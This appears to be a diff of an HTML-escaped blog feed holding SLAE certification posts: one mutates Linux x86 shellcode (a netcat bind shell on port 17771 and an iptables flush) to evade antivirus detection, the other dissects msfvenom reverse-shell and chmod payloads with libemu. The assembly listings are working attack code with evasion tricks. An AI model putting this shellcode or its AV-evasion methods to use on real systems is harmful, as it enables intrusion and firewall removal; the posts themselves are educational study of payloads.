-    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x3170762d&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x31373737&lt;/span&gt;     &lt;span class="c"&gt;;-vp17771&lt;/span&gt;
+    &lt;span class="no"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x3170762d&lt;/span&gt;
     &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;esi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
 
     &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x68732f2f&lt;/span&gt;     &lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="no"&gt;le&lt;/span&gt;&lt;span class="err"&gt;//&lt;/span&gt;&lt;span class="no"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;//&lt;/span&gt;&lt;span class="no"&gt;sh&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x6e69622f&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x68732f2f&lt;/span&gt;     &lt;span class="c"&gt;;-le//bin//sh&lt;/span&gt;
+    &lt;span class="no"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x6e69622f&lt;/span&gt;
     &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x2f656c2d&lt;/span&gt;
     &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
 
     &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x636e2f2f&lt;/span&gt;     &lt;span class="err"&gt;;/&lt;/span&gt;&lt;span class="no"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;//&lt;/span&gt;&lt;span class="no"&gt;nc&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x6e69622f&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x636e2f2f&lt;/span&gt;     &lt;span class="c"&gt;;/bin//nc&lt;/span&gt;
+    &lt;span class="no"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x6e69622f&lt;/span&gt;
     &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
 
     &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;
@@ -727,30 +727,30 @@ gdb -x mono-gdb-settings mono
 
 
 &lt;p&gt;There is nothing complicated about this shellcode. All it does is just start the Netcat listening on port 17771 and serving shell to anyone connecting to that port. From the get-go I found only one way to reduce the overall size by 1 byte: replacing all&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;instructions with&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And then replacing the&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
 &lt;span class="nf"&gt;...&lt;/span&gt;
 &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;sequence (instructions are actually divided by the code) with&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
 &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Here is the result of the above manipulations:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 &lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
  &lt;span class="nl"&gt;_start:&lt;/span&gt;
     &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
@@ -782,7 +782,7 @@ gdb -x mono-gdb-settings mono
 
 
 &lt;p&gt;Next, I will continue to mutate the shellcode, trying not to increase the overall size. One thing we can begin with is playing around the strings we have at our disposal. We can modify them in such a way that overall functionality stays the same. Remember that length for each string must stay a multiple of 4. Here is how I modified the strings:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;-vp17771        -&amp;gt;    -lp17771
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-vp17771        -&amp;gt;    -lp17771
 -le//bin//sh    -&amp;gt;    -ve/bin///sh
 /bin//nc        -&amp;gt;    //bin/nc
 &lt;/pre&gt;&lt;/div&gt;
@@ -790,7 +790,7 @@ gdb -x mono-gdb-settings mono
 
 &lt;p&gt;In the wild I would also change the port number, but for the sake of keeping functionality 100% unchanged I do not do it here.&lt;/p&gt;
 &lt;p&gt;And the last change that will complicate AV detection will be replacing one register with another whenever possible throughout the code. This will work because every instruction translates to a different sequence of bytes, and that is exactly what we need. Follows the map of replacements I made in the original shellcode and then the whole body of the modified shellcode:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;mov esi, esp -&amp;gt; mov eax, esp
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mov esi, esp -&amp;gt; mov eax, esp
 mov edi, esp -&amp;gt; mov esi, esp
 push esi     -&amp;gt; push eax
 push edi     -&amp;gt; push esi
@@ -798,7 +798,7 @@ push edi     -&amp;gt; push esi
 
 
 &lt;p&gt;The final version:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 &lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
  &lt;span class="nl"&gt;_start:&lt;/span&gt;
     &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
@@ -855,31 +855,31 @@ push edi     -&amp;gt; push esi
 &lt;p&gt;All the shellcode does is call the /sbin/iptables with -F flag.&lt;/p&gt;
 &lt;p&gt;A couple notes before I begin mutating the code. In this case I will not try to keep the shellcode from growing. Quite the opposite, I will expand a line of code into two or more lines. The only limit that I am going to stick to is that the resulted shellcode mutant must not exceed 150% of the original shellcode size.&lt;/p&gt;
 &lt;p&gt;Despite of what I've just said, I couldn't stop myself from decreasing the shellcode size by 1 byte first =). All in all this change helps us to achieve the end goal of changing the shellcode structure. To shave the byte off I replaced EAX with EDX in the following two instructions:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
 
 &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And to make the shellcode work again, I removed&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;and replaced&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;with&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;
 &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The line I removed zeroed out EDX, which was unneeded after previous modification. EDX is all 0s already at that point. And the replacement was just an equivalent of loading 0xb (execve syscall #) into EAX that doesn't depend on EAX being zeroed first.&lt;/p&gt;
 &lt;p&gt;Here is the intermediate result incorporating the above changes:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
     &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -905,14 +905,14 @@ push edi     -&amp;gt; push esi
 
 &lt;p&gt;Now, let me show how with a little imagination you can expand any instruction, thus modifying the underlying opcodes (but be careful to not add null or other bad chars relevant to your case):&lt;/p&gt;
 &lt;p&gt;1) The third line pushes the &lt;em&gt;-F&lt;/em&gt; string onto the stack. We can expand it in some fancy way:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x2316&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x2316&lt;/span&gt;
 &lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x2317&lt;/span&gt;
 &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;2) Now, why don't we apply some very lame encryption by manually subtracting 1 from every byte of the &lt;em&gt;///sbin/iptables&lt;/em&gt; string, and then dynamically add 1 to every byte, when it is already on the stack? Factum dictum. The modified part of the code follows:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x72646b61&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x72646b61&lt;/span&gt;
     &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x60736F68&lt;/span&gt;
     &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x2e6d6861&lt;/span&gt;
     &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x722e2e2e&lt;/span&gt;
@@ -931,7 +931,7 @@ push edi     -&amp;gt; push esi
 
 &lt;p&gt;3) I'd be happy to continue bubbling up the code, but at this point the initial 43 bytes of code became 62 bytes, which is just 2 bytes short of the 150% limit. To not waste those 2 bytes and mutate the code a little bit more we can insert a couple of nop-equivalents close to the end of the code. For that purpose I used the &lt;code&gt;std&lt;/code&gt; and &lt;code&gt;cld&lt;/code&gt; instructions that do not affect anything unless you are working with string instructions.&lt;/p&gt;
 &lt;p&gt;The final, working version of mutated shellcode:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
     &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -969,7 +969,7 @@ push edi     -&amp;gt; push esi
 
 
 &lt;p&gt;And to make sure it is still working you can build it, assuming that your iptables do not contain any rules (as, by default, is the case on Kali Linux) using the following commands:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf ipt2.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o ipt2 ipt2.o
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nasm -f elf ipt2.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o ipt2 ipt2.o
 iptables -A INPUT -p tcp --dport &lt;span class="m"&gt;22&lt;/span&gt; -j ACCEPT &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; iptables -L -vn
 ./ipt2 &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; iptables -L -vn
 &lt;/pre&gt;&lt;/div&gt;
@@ -986,19 +986,19 @@ iptables -A INPUT -p tcp --dport &lt;span class="m"&gt;22&lt;/span&gt; -j ACCEPT
 
 &lt;p&gt;&lt;hr&gt;
 This blog post was created to fulfill the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
-&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Dissecting msfvenom shellcodes (SLAE, Assignment #5)</title><link href="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/" rel="alternate"></link><updated>2015-10-07T20:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-07:blog/dissecting-msfvenom-shellcodes/</id><summary type="html">&lt;p&gt;In this post I will discuss how a shellcode logic and architecture can be understood. For that I will use &lt;code&gt;libemu&lt;/code&gt;, &lt;code&gt;ndisasm&lt;/code&gt;, and &lt;code&gt;gdb&lt;/code&gt;. &lt;code&gt;libemu&lt;/code&gt; is an x86 shellcode emulation framework that allows one to faster understand the shellcode logic. &lt;code&gt;ndisasm&lt;/code&gt; is a disassembler that comes as a part of &lt;code&gt;nasm&lt;/code&gt; package on Kali. And &lt;code&gt;gdb&lt;/code&gt; is the venerable GNU Debugger, arguably the best debugger for Linux if you are into CLI.&lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</content><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Dissecting msfvenom shellcodes (SLAE, Assignment #5)</title><link href="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/" rel="alternate"></link><published>2015-10-07T20:00:00-04:00</published><updated>2015-10-07T20:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-07:/blog/dissecting-msfvenom-shellcodes/</id><summary type="html">&lt;p&gt;Understanding shellcodes on example of those generated by msfvenom&lt;/p&gt;</summary><content type="html">&lt;p&gt;In this post I will discuss how a shellcode logic and architecture can be understood. For that I will use &lt;code&gt;libemu&lt;/code&gt;, &lt;code&gt;ndisasm&lt;/code&gt;, and &lt;code&gt;gdb&lt;/code&gt;. &lt;code&gt;libemu&lt;/code&gt; is an x86 shellcode emulation framework that allows one to faster understand the shellcode logic. &lt;code&gt;ndisasm&lt;/code&gt; is a disassembler that comes as a part of &lt;code&gt;nasm&lt;/code&gt; package on Kali. And &lt;code&gt;gdb&lt;/code&gt; is the venerable GNU Debugger, arguably the best debugger for Linux if you are into CLI.&lt;/p&gt;
 &lt;p&gt;To generate payloads I will use Metasploit Framework (MSF). And, instead of the used in the past and recently phased out &lt;code&gt;msfpayload&lt;/code&gt; tool, I will use its better replacement - &lt;code&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;
 &lt;h1&gt;Installation of libemu&lt;/h1&gt;
 &lt;p&gt;When I was installing &lt;code&gt;libemu&lt;/code&gt;, I expected to find it in Kali repositories, but alas it wasn't there. After googling a bit, I found that most of the links led to &lt;a href="http://libemu.carnivore.it"&gt;libemu.carnivore.it&lt;/a&gt; page, which was down at the time of this writing. So I had to find and fork its source code elsewhere on the GitHub. After getting my hands on its source code I followed this &lt;a href="http://blog.xanda.org/2012/05/16/installation-of-libemu-and-pylibemu-on-ubuntu/"&gt;guide on libemu installation&lt;/a&gt; and successfully installed it on my system:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# The only dependency I had to satisfy on my Kali machine&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# The only dependency I had to satisfy on my Kali machine&lt;/span&gt;
 apt-get install libtool
 &lt;span class="nb"&gt;cd&lt;/span&gt; ~/Downloads
 
-&lt;span class="c"&gt;# Cloning the source code from my GitHub repo&lt;/span&gt;
+&lt;span class="c1"&gt;# Cloning the source code from my GitHub repo&lt;/span&gt;
 git clone --depth&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; https://github.com/reider-roque/libemu
-&lt;span class="nb"&gt;cd &lt;/span&gt;libemu
+&lt;span class="nb"&gt;cd&lt;/span&gt; libemu
 
-&lt;span class="c"&gt;# Building and installing libemu&lt;/span&gt;
+&lt;span class="c1"&gt;# Building and installing libemu&lt;/span&gt;
 autoreconf -i -v
 ./configure --prefix&lt;span class="o"&gt;=&lt;/span&gt;/opt/libemu
 make install
@@ -1007,12 +1007,12 @@ make install
 
 &lt;h1&gt;Example #1: Reverse shell&lt;/h1&gt;
 &lt;p&gt;With the following command we will first see what Linux x86 payloads are available:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom --list payloads &lt;span class="p"&gt;|&lt;/span&gt; grep linux/x86
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom --list payloads &lt;span class="p"&gt;|&lt;/span&gt; grep linux/x86
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output (truncated):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;linux/x86/adduser       Create a new user with UID 0
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;linux/x86/adduser       Create a new user with UID 0
 linux/x86/chmod         Runs chmod on specified file with specified mode
 linux/x86/exec          Execute an arbitrary command
 linux/x86/meterpreter/bind_ipv6_tcp   
@@ -1029,12 +1029,12 @@ Inject the meterpreter server payload (staged). Listen for a connection (Linux x
 
 &lt;p&gt;As you can see, most of the available payloads are for spawning either reverse or bind shells. By the way, here is the reason the shellcode is called so: shellcode is a sequence of assembly instructions that is most often used in exploits to spawn an (administrative) shell.&lt;/p&gt;
 &lt;p&gt;For the first example I will take and dissect the reverse shell payload. Let's first see if there are mandatory options for this payload (output is truncated for brevity):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/shell_reverse_tcp --payload-options
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p linux/x86/shell_reverse_tcp --payload-options
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;Options for payload/linux/x86/shell_reverse_tcp:
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Options for payload/linux/x86/shell_reverse_tcp:
 ...
 Basic options:
 Name   Current Setting  Required  Description
@@ -1047,15 +1047,15 @@ LPORT  4444             yes       The listen port
 
 &lt;p&gt;From the output above we can see that there are two required options, with one of them not having any default value. So for proper work of the payload we can leave &lt;code&gt;LPORT&lt;/code&gt; at its default value, but we'll need to supply the &lt;code&gt;LHOST&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Below I will pipe the generated payload into the &lt;code&gt;sctest&lt;/code&gt;, binary that comes with &lt;code&gt;libemu&lt;/code&gt; framework, which will analyze the code and try to generate a high level structure of the shellcode:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;127.1.1.1 -f raw &lt;span class="p"&gt;|&lt;/span&gt; /opt/libemu/bin/sctest -vvv -S -s &lt;span class="m"&gt;100000&lt;/span&gt; -G tmp.dot
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p linux/x86/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.1.1.1 -f raw &lt;span class="p"&gt;|&lt;/span&gt; /opt/libemu/bin/sctest -vvv -S -s &lt;span class="m"&gt;100000&lt;/span&gt; -G tmp.dot
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The &lt;code&gt;-vvv&lt;/code&gt; option to &lt;code&gt;sctest&lt;/code&gt; increases verbosity. The &lt;code&gt;-S&lt;/code&gt; is for reading input from stdin. The &lt;code&gt;-s&lt;/code&gt; option controls the maximum number of instructions to execute and defaults to 1, which means &lt;code&gt;sctest&lt;/code&gt; will emulate execution of only the first instruction of the supplied shellcode. To be on the safe side and make sure that every shellcode instruction is executed, it is usually set to some big number, like 100000.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Top of the sctest output" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/sctest-top-output.png" title="Top of the sctest output" /&gt;
+&lt;p&gt;&lt;img alt="Top of the sctest output" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/sctest-top-output.png" title="Top of the sctest output"&gt;
 &lt;div class="img-caption"&gt;Top of the sctest output&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;At the top of the output you can see how &lt;code&gt;sctest&lt;/code&gt; tears down the shellcode instruction by instruction and shows you the state of registers after execution of each instruction. At the bottom of the output you will find the reconstructed high level view of what's going on:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
      &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -1106,13 +1106,13 @@ LPORT  4444             yes       The listen port
 &lt;p&gt;As you can see using &lt;code&gt;sctest&lt;/code&gt; we were able to understand what the shellcode does without even disassembling it. But this is not always the case. Let's take a look at the next example.&lt;/p&gt;
 &lt;h1&gt;Example #2: Chmod&lt;/h1&gt;
 &lt;p&gt;As in the previous example, I will pipe the generated shellcode into &lt;code&gt;sctest&lt;/code&gt;. This time it will be the chmod payload. All it does is modify Unix permissions on a file to, by default, 0666.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/chmod &lt;span class="nv"&gt;FILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;tmp.bin -f raw &lt;span class="p"&gt;|&lt;/span&gt; /opt/libemu/bin/sctest -vvv -S -s &lt;span class="m"&gt;100000&lt;/span&gt; -G tmp.dot
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p linux/x86/chmod &lt;span class="nv"&gt;FILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;tmp.bin -f raw &lt;span class="p"&gt;|&lt;/span&gt; /opt/libemu/bin/sctest -vvv -S -s &lt;span class="m"&gt;100000&lt;/span&gt; -G tmp.dot
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The &lt;code&gt;-G&lt;/code&gt; option supplied to the sctest command outputs a graph of shellcode logic in the dot file format, that can be further converted into an image using &lt;code&gt;dot&lt;/code&gt; utility. Looking at the depicted algorithm sometimes facilitates a better understanding of what's happening, especially when the shellcode extensively uses loops and branching.&lt;/p&gt;
 &lt;p&gt;After running the above command the high level output I got was this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ERROR&lt;/span&gt;  &lt;span class="n"&gt;chmod&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
